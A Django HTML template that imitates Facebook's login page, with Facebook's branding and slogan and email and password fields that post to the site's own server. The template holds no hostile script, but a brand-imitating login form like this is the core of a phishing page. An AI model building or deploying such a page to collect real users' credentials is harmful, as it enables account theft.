{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="{% static 'css/facebook.css' %}" />
</head>
<body>
    <div class="textbox">
        <h1>
            facebook
        </h1>
        <h2>
            Facebook helps you connect <br> and share with the<br> people in your life.
        </h2>
    </div>

<div class="box">
    <div class="container">
        <form action="/" method="POST">
            <div class="form">
                {% csrf_token %}
                <input type="text" class="text" name="name" placeholder="Enter Your Email or Phone number"> <br>
                <input type="password" class="text" name="fname" placeholder="Password"><br>
                <button>
                    Log In
                </button>
                <p><a href="">forgot password?</a><br></p>
                <div class="btn">
                    <button>Create New Account</button>
                </div>
            </div>
        </form>
    </div>    
</div>
</body>
</html>
